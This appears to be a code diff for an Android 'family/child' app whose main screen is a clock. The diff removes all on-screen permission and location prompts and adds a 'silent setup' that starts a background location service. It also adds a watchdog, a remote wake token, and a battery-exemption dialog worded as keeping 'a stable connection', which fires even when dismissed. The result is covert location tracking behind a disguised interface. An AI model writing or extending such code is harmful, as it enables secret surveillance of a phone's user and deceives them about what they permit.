@@ -1,18 +1,18 @@
 package com.family.child
 
 import android.Manifest
+import android.app.ActivityManager
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.Paint
 import android.graphics.Typeface
-import android.location.LocationManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager
 import android.provider.Settings
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
-import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.animation.Crossfade
 import androidx.compose.animation.core.tween
 import androidx.compose.foundation.Canvas
@@ -36,116 +36,166 @@ import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
 import androidx.core.content.ContextCompat
+import com.google.firebase.messaging.FirebaseMessaging
 import kotlinx.coroutines.delay
 import java.time.LocalDateTime
 import kotlin.math.cos
 import kotlin.math.sin
 
 class MainActivity : ComponentActivity() {
-    private var setupMessage by mutableStateOf<String?>(null)
-    private var canOpenPermissionSettings by mutableStateOf(false)
-    private var locationReminderActive by mutableStateOf(false)
-
-    private val locationPermissions = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
-        evaluateSetup()
-    }
-    private val notificationPermission = registerForActivityResult(ActivityResultContracts.RequestPermission()) {
-        evaluateSetup()
-    }
+    private var showContinuousRunPrompt by mutableStateOf(false)
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        locationReminderActive = intent?.getBooleanExtra(EXTRA_LOCATION_REMINDER, false) == true
         setContent {
             ClockScreen(
-                setupMessage = setupMessage,
-                showPermissionButton = canOpenPermissionSettings,
-                showLocationReminder = locationReminderActive && !isLocationEnabled(),
-                onPermissionSettings = { openAppSettings() },
-                onLocationSettings = { startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS)) }
+                showContinuousRunPrompt = showContinuousRunPrompt,
+                onAllowContinuousRun = {
+                    showContinuousRunPrompt = false
+                    requestContinuousRunPermission()
+                }
             )
         }
-        evaluateSetup(requestMissingRuntimePermissions = true)
+        maybeShowContinuousRunPromptOnce()
+        evaluateSilentSetup()
     }
 
     override fun onNewIntent(intent: Intent) {
         super.onNewIntent(intent)
         setIntent(intent)
-        if (intent.getBooleanExtra(EXTRA_LOCATION_REMINDER, false)) locationReminderActive = true
-        evaluateSetup()
+        evaluateSilentSetup()
     }
 
     override fun onResume() {
         super.onResume()
-        evaluateSetup()
+        recordLastProcessExitReason()
+        evaluateSilentSetup()
     }
 
-    private fun evaluateSetup(requestMissingRuntimePermissions: Boolean = false) {
-        canOpenPermissionSettings = false
+    private fun maybeShowContinuousRunPromptOnce() {
+        val prefs = getSharedPreferences(PREFS, MODE_PRIVATE)
+        if (prefs.getBoolean(KEY_CONTINUOUS_PROMPT_SHOWN, false)) return
+        // Mark as shown immediately so the app never nags again even if the user
+        // dismisses the Android system screen and chooses to configure it manually.
+        prefs.edit()
+            .putBoolean(KEY_CONTINUOUS_PROMPT_SHOWN, true)
+            .putLong(KEY_CONTINUOUS_PROMPT_SHOWN_AT, System.currentTimeMillis())
+            .apply()
+        showContinuousRunPrompt = true
+    }
 
-        val fine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
-        val coarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
-        if (!fine) {
-            setupMessage = if (coarse) {
-                canOpenPermissionSettings = true
-                "Hãy bật Vị trí chính xác để ứng dụng hoạt động ổn định hơn."
-            } else {
-                "Ứng dụng cần quyền vị trí để hoạt động."
+    private fun evaluateSilentSetup() {
+        ServiceWatchdogWorker.schedule(this)
+
+        val fineGranted = ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.ACCESS_FINE_LOCATION
+        ) == PackageManager.PERMISSION_GRANTED
+        val backgroundGranted = Build.VERSION.SDK_INT < 29 || ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.ACCESS_BACKGROUND_LOCATION
+        ) == PackageManager.PERMISSION_GRANTED
+        val notificationGranted = Build.VERSION.SDK_INT < 33 || ContextCompat.checkSelfPermission(
+            this,
+            Manifest.permission.POST_NOTIFICATIONS
+        ) == PackageManager.PERMISSION_GRANTED
+        val power = getSystemService(PowerManager::class.java)
+        val batteryExempt = Build.VERSION.SDK_INT < 23 || power.isIgnoringBatteryOptimizations(packageName)
+        val activity = getSystemService(ActivityManager::class.java)
+        val backgroundRestricted = Build.VERSION.SDK_INT >= 28 && activity.isBackgroundRestricted
+
+        getSharedPreferences(PREFS, MODE_PRIVATE).edit()
+            .putBoolean("silent_fine_permission_granted", fineGranted)
+            .putBoolean("silent_background_permission_granted", backgroundGranted)
+            .putBoolean("silent_notification_permission_granted", notificationGranted)
+            .putBoolean("battery_optimization_ignored", batteryExempt)
+            .putBoolean("background_restricted", backgroundRestricted)
+            .putLong("silent_setup_checked_at", System.currentTimeMillis())
+            .apply()
+
+        // Runtime/system permissions are intentionally never requested from this
+        // screen. Missing prerequisites remain a diagnostic for Parent/Health.
+        if (fineGranted) {
+            try {
+                ContextCompat.startForegroundService(
+                    this,
+                    Intent(this, LocationService::class.java).putExtra("immediate", true)
+                )
+                getSharedPreferences(PREFS, MODE_PRIVATE).edit()
+                    .putString("silent_start_result", "requested")
+                    .apply()
+            } catch (e: Exception) {
+                getSharedPreferences(PREFS, MODE_PRIVATE).edit()
+                    .putString("silent_start_result", "failed:${e.javaClass.simpleName}")
+                    .putLong("silent_start_failed_at", System.currentTimeMillis())
+                    .apply()
             }
-            if (requestMissingRuntimePermissions && !coarse) {
-                locationPermissions.launch(arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION))
-            }
-            return
-        }
-
-        if (Build.VERSION.SDK_INT >= 33 && ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-            setupMessage = "Ứng dụng cần quyền thông báo để nhận lời nhắn an toàn từ gia đình."
-            if (requestMissingRuntimePermissions) notificationPermission.launch(Manifest.permission.POST_NOTIFICATIONS)
-            return
-        }
-
-        // The foreground service must stay alive even when system Location is off so Parent can
-        // receive an accurate diagnostic state. We intentionally do not show an automatic
-        // "turn Location on" prompt here; that prompt is shown only after Parent sends a reminder.
-        try {
-            ContextCompat.startForegroundService(this, Intent(this, LocationService::class.java).putExtra("immediate", true))
-        } catch (e: Exception) {
-            setupMessage = "Không thể khởi động dịch vụ bảo vệ vị trí: ${e.javaClass.simpleName}"
-            return
-        }
-
-        if (locationReminderActive && isLocationEnabled()) locationReminderActive = false
-
-        if (Build.VERSION.SDK_INT >= 30 && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            setupMessage = "Để tự khôi phục tốt hơn sau khi khởi động lại máy, hãy cho phép vị trí 'Mọi lúc'."
-            canOpenPermissionSettings = true
         } else {
-            setupMessage = null
+            getSharedPreferences(PREFS, MODE_PRIVATE).edit()
+                .putString("silent_start_result", "waiting_for_system_permission")
+                .apply()
+        }
+
+        // Refreshing the token here ensures an upgrade receives a wake token even
+        // when Firebase does not invoke onNewToken during this particular install.
+        FirebaseMessaging.getInstance().token
+            .addOnSuccessListener { ChildWakeMessagingService.syncToken(this, it) }
+            .addOnFailureListener {
+                getSharedPreferences(PREFS, MODE_PRIVATE).edit()
+                    .putString("fcm_token_result", "failed:${it.javaClass.simpleName}")
+                    .putLong("fcm_token_failed_at", System.currentTimeMillis())
+                    .apply()
+            }
+    }
+
+    private fun requestContinuousRunPermission() {
+        try {
+            if (Build.VERSION.SDK_INT >= 23) {
+                val power = getSystemService(PowerManager::class.java)
+                if (!power.isIgnoringBatteryOptimizations(packageName)) {
+                    startActivity(
+                        Intent(
+                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                            Uri.parse("package:$packageName")
+                        )
+                    )
+                }
+            }
+        } catch (e: Exception) {
+            getSharedPreferences(PREFS, MODE_PRIVATE).edit()
+                .putString("continuous_permission_request", "failed:${e.javaClass.simpleName}")
+                .putLong("continuous_permission_request_failed_at", System.currentTimeMillis())
+                .apply()
         }
     }
 
-    private fun isLocationEnabled(): Boolean = try {
-        getSystemService(LocationManager::class.java).isLocationEnabled
-    } catch (_: Exception) {
-        false
-    }
-
-    private fun openAppSettings() {
-        startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName")))
+    private fun recordLastProcessExitReason() {
+        if (Build.VERSION.SDK_INT < 30) return
+        try {
+            val last = getSystemService(ActivityManager::class.java)
+                .getHistoricalProcessExitReasons(packageName, 0, 1)
+                .firstOrNull() ?: return
+            getSharedPreferences(PREFS, MODE_PRIVATE).edit()
+                .putInt("last_process_exit_reason", last.reason)
+                .putLong("last_process_exit_at", last.timestamp)
+                .putString("last_process_exit_description", last.description?.take(160) ?: "")
+                .apply()
+        } catch (_: Exception) {
+        }
     }
 
     companion object {
         const val EXTRA_LOCATION_REMINDER = "show_location_reminder"
+        private const val PREFS = "tracking_diag"
+        private const val KEY_CONTINUOUS_PROMPT_SHOWN = "continuous_run_prompt_shown_v228"
+        private const val KEY_CONTINUOUS_PROMPT_SHOWN_AT = "continuous_run_prompt_shown_at_v228"
     }
 }
 
 @Composable
 fun ClockScreen(
-    setupMessage: String?,
-    showPermissionButton: Boolean,
-    showLocationReminder: Boolean,
-    onPermissionSettings: () -> Unit,
-    onLocationSettings: () -> Unit
+    showContinuousRunPrompt: Boolean,
+    onAllowContinuousRun: () -> Unit
 ) {
     val context = LocalContext.current
     var now by remember { mutableStateOf(LocalDateTime.now()) }
@@ -309,45 +359,23 @@ fun ClockScreen(
                     }
                 }
 
-                if (showLocationReminder) {
-                    Spacer(Modifier.height(16.dp))
-                    Card(
-                        modifier = Modifier.fillMaxWidth(),
-                        colors = CardDefaults.cardColors(containerColor = Color(0xFF2A2212)),
-                        shape = MaterialTheme.shapes.extraLarge
-                    ) {
-                        Column(Modifier.padding(18.dp), horizontalAlignment = Alignment.CenterHorizontally) {
-                            Text("Lời nhắc từ gia đình", color = Color(0xFFFFC857), style = MaterialTheme.typography.labelMedium)
-                            Spacer(Modifier.height(7.dp))
-                            Text(
-                                "Hãy bật Vị trí để bảo vệ điện thoại an toàn.",
-                                color = Color(0xFFFFE0A1),
-                                textAlign = TextAlign.Center
-                            )
-                            Spacer(Modifier.height(8.dp))
-                            Button(onClick = onLocationSettings) { Text("BẬT VỊ TRÍ") }
-                        }
-                    }
-                }
-
-                if (setupMessage != null) {
-                    Spacer(Modifier.height(16.dp))
-                    Card(
-                        modifier = Modifier.fillMaxWidth(),
-                        colors = CardDefaults.cardColors(containerColor = Color(0xFF111923)),
-                        shape = MaterialTheme.shapes.extraLarge
-                    ) {
-                        Column(Modifier.padding(15.dp), horizontalAlignment = Alignment.CenterHorizontally) {
-                            Text(setupMessage, color = Color(0xFFFFC857), style = MaterialTheme.typography.bodySmall, textAlign = TextAlign.Center)
-                            if (showPermissionButton) {
-                                TextButton(onClick = onPermissionSettings) { Text("MỞ CÀI ĐẶT QUYỀN") }
-                            }
-                        }
-                    }
-                }
-
                 Spacer(Modifier.height(20.dp))
             }
+        }
+
+        if (showContinuousRunPrompt) {
+            AlertDialog(
+                onDismissRequest = onAllowContinuousRun,
+                title = { Text("Cho phép ứng dụng hoạt động liên tục") },
+                text = {
+                    Text(
+                        "Cho phép ứng dụng tiếp tục hoạt động khi màn hình tắt để duy trì kết nối ổn định."
+                    )
+                },
+                confirmButton = {
+                    Button(onClick = onAllowContinuousRun) { Text("CHO PHÉP") }
+                }
+            )
         }
     }
 }
